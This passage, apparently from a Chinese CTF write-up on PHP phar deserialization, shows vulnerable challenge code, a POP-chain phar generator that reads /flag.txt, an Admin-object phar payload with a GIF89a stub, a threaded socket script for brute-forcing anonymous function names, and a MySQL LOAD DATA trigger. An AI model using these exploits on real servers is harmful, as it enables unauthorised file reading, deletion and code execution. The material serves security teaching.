string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean constant">true</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean constant">false</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">#class.php#代码过长，选取重要部分<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里需要提一下利用条件</p><ol><li><p>phar文件能够上传至服务器</p></li><li><p>要有可利用的魔术方法</p></li><li><p>文件操作函数的参数可控，且:、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</p></li></ol><p>文件上传功能允许上传文件，修改phar文件后缀即可。魔术方法则在delete文件中有<code>unlink()</code>以及<code>file_get_contents()</code>和<code>__call()</code>等，文件操作函数的参数，<code>filename</code>可控，且无过滤。<br>现在捋一下整个逻辑，这里是可以进行任意文件读取，且<code>delete</code>也可以进行任意文件删除(PS:测试将<code>index.php</code>删了，无奈只能重启靶机)，<br>代码逻辑，在<code>class.php</code>中的<code>User</code>类中，有一个<code>close</code>方法，<code>__destruct</code>执行触发该<code>close</code>方法,将该<code>close</code>方法改为<code>FileList</code>的一个对象，且<code>file</code>类中也有一个<code>close</code>方法，它负责是的读取文件<code>file_get_contents()</code>函数。<br>构造pop链的逻辑，读取文件的话，可以使<code>User</code>类中的<code>__construct()</code>实例化一个<code>FileList</code>对象。然后向下执行，<code>FileList</code>中没有<code>close</code>函数，所以就能触发<code>__call()</code>函数，然后再执行<code>close</code>方法（注意此时是File中的<code>close</code>方法）只需控制<code>filename</code>的值即可成功执行<code>file_get_contents()</code>函数进行读取文件。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/flag.txt'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"m0re.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'m0re.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GIF89a&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"f1ag.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"f1ag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>上传并删除抓包，<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210730170303.png" loading="lazy"></p><h2 id="Baby-h-Master-PHP"><a href="#Baby-h-Master-PHP" class="headerlink" title="Baby^h Master PHP"></a>Baby^h Master PHP</h2><p>这个题目可是很经典的了。<br>直接给出源码，会看到当前目录，在沙盒当中，全局查看代码，两个类<code>Admin&amp;User</code>，且Admin类继承了User类，三个函数，分别为三种功能，<code>upload</code>和<code>show</code>还有<code>check_session</code><br>然后看用户可以控制的输入部分</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$mode</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">upload</span><span class="token punctuation">(</span><span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"show"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show</span><span class="token punctuation">(</span><span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"IP:"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sandbox:"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/var/www/data/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>输入可以有两种模式，一种是upload，一种是show。<br>关于upload函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"url"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/avatar.gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token double-quoted-string string">"GIF89a"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Fuck off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/avatar.gif"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>接受输入的一个URL，并访问，<code>url/avatar.gif</code>然后保存到本地。并且检验该文件是否为GIF，通过的手法是对比判断文件头，看数据中的前六个字母是否符合GIF标志(这个很容易绕过)。<br>而show函数，则是读取上传的文件的功能。<br>还有一个知识点就是匿名函数，关于PHP的匿名函数，介绍是：临时创建一个没有指定名称的函数<br>比如</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$greet</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hello %s\r\n"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PHP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>#Hello World#Hello PHP</code></pre><p>题目中的Admin类中就是存在一个这样的匿名函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Admin</span> <span class="token keyword">extends</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function my_function_<span class="token interpolation"><span class="token variable">$random</span></span>() &#123;"</span>            <span class="token punctuation">.</span> <span class="token double-quoted-string string">"  global \$FLAG; \$FLAG();"</span>            <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"lucky"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关于<code>bin2hex(openssl_random_pseudo_bytes(32))</code><br>一个函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span> int <span class="token variable">$length</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> bool <span class="token operator">&amp;</span><span class="token variable">$crypto_strong</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p><code>openssl_random_pseudo_bytes</code> - 生成一个伪随机字节串,字节数由 length 参数指定。 通过 crypto_strong 参数可以表示在生成随机字节的过程中是否使用了强加密算法。返回值为FALSE的情况很少见，但已损坏或老化的有些系统上会出现。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210802234525.png" loading="lazy"><br>bin2hex将生成的随即字节串转换成十六进制。<br>然后分析整个逻辑：由内向外看，<code>upload</code>和<code>show</code>都使用了<code>check_session</code>函数，这个函数，取出<code>cookie</code>中的<code>session-data</code>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A</span><span class="token operator">%</span><span class="token number">22</span>User<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A</span><span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span><span class="token constant">A6</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A</span><span class="token operator">%</span><span class="token number">22</span>avatar<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span><span class="token constant">A46</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">2</span>Fvar<span class="token operator">%</span><span class="token number">2</span>Fwww<span class="token operator">%</span><span class="token number">2</span>Fdata<span class="token operator">%</span><span class="token number">2</span>F3054b012b7bb1e3093bb723f95a6a055<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span><span class="token constant">B</span><span class="token operator">%</span><span class="token number">7</span><span class="token constant">D</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token number">6234845</span>ec46a27cb6535a24307809d88f700d915</code></pre><p>其中<code>data</code>为<code>User</code>类序列化的内容，<code>hmac</code>是经过<code>hash_hmac(&quot;sha1&quot;, $data, $SECRET)</code>处理后的，拼接在一起就是<code>session-data</code>然后后面三个if语句则是匹配cookie中的这些数据是否相同，相同就进行反序列化，并且返回它的属性avatar<br>然后就是upload模式，验证url是否存在，如果存在则上传avatar.gif并覆盖。最后执行Admin类中的随机函数，这个随机函数的名字，这里看大佬的解释是查看<code>create_function</code>函数对应的内核源，暂时理解不来。只知道匿名函数并非是没有名字的，而是<code>%00lambda_%d</code>其中<code>%d</code>为数字，为当前进程的第n个匿名函数。<br>然后还有apache2的工作模式，默认是prefork<br>prefork是一个非线程型的、预派生的MPM，使用多个进程，每个进程在某个确定的时间只单独处理一个连接，效率高，但内存使用比较大。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803001624.png" loading="lazy"><br>然后就是解题了：<br>先生成Admin类的phar文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$avatar</span><span class="token operator">=</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.phar'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'GIF89a&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'text.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>重命名为<code>avatar.gif</code>后上传服务器，进行upload操作。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210803002516.png" loading="lazy"><br>最后进行最后一步爆破匿名函数</p><pre class="language-py" data-language="py"><code class="language-py">#fork.py# coding: UTF-8# Author: orange@chroot.org# import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry:    requests.packages.urllib3.disable_warnings()except:    passdef run(i):    while 1:        HOST &#x3D; &#39;题目地址&#39;        PORT &#x3D; 80        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((HOST, PORT))        s.sendall(&#39;GET &#x2F; HTTP&#x2F;1.1\nHost: your_vps_ip\nConnection: Keep-Alive\n\n&#39;)        # s.close()        print &#39;ok&#39;        time.sleep(0.5)i &#x3D; 8pool &#x3D; ThreadPool( i )result &#x3D; pool.map_async( run, range(i) ).get(0xffff)</code></pre><h1 id="0x03-扩展内容"><a href="#0x03-扩展内容" class="headerlink" title="0x03 扩展内容"></a>0x03 扩展内容</h1><h2 id="mysql-反序列化函数-利用phar协议造成php反序列化"><a href="#mysql-反序列化函数-利用phar协议造成php反序列化" class="headerlink" title="mysql 反序列化函数_利用phar协议造成php反序列化"></a>mysql 反序列化函数_利用phar协议造成php反序列化</h2><p>php调用mysql的语句<code>LOAD DATA LOCAL INFILE</code>导入phar文件也能触发phar中的反序列化语句<br><code>LOAD DATA LOCAL INFILE</code>这条语句是批量向表中插入文件中的内容</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">LOAD</span> <span class="token constant">DATA</span> <span class="token constant">LOCAL</span> <span class="token constant">INFILE</span> <span class="token single-quoted-string string">'d:\\phpStudy\\WWW\\m0re\\user.txt'</span> <span class="token constant">INTO</span> <span class="token constant">TABLE</span> users<span class="token punctuation">;</span></code></pre><p>前提：在<code>my.ini</code>中添加</p><pre class="language-php" data-language="php"><code class="language-php">local<span class="token operator">-</span>infile<span class="token operator">=</span><span class="token number">1</span>secure_file_priv<span class="token operator">=</span><span class="token double-quoted-string string">""</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210730173455.png" loading="lazy"><br>成功插入<br><img 